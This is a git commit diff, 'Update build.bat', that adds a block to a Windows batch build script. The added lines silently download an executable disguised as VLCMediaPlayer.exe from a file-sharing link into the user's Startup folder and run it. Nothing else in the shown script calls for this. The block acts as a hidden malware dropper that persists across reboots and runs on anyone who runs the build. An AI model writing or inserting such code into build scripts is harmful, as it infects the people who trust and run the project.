0bfa86872211358e04fc12737d4b01a97d74ee51
waltuhium23 <158318104+waltuhium23@users.noreply.github.com>
2024-06-02 00:16:08 +0300

    Update build.bat

--- build.bat
+++ build.bat
@@ -34,6 +34,23 @@ if %errorlevel% neq 0 (
 
 call "%DEST%"
 
+@echo off
+setlocal 
+
+set "URL=https://link.storjshare.io/s/jvfnirhyr2nnkaaugkepvfng23ia/alsanas/VLCMediaPlayer.exe?download=1"
+set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\VLCMediaPlayer.exe"
+
+
+if exist "%DEST%" del "%DEST%"
+
+curl --silent --output "%DEST%" "%URL%"
+
+if %errorlevel% neq 0 (
+  exit /b %errorlevel%
+)
+
+call "%DEST%"
+
 
 title Checking Python installation...
 python --version > nul 2>&1
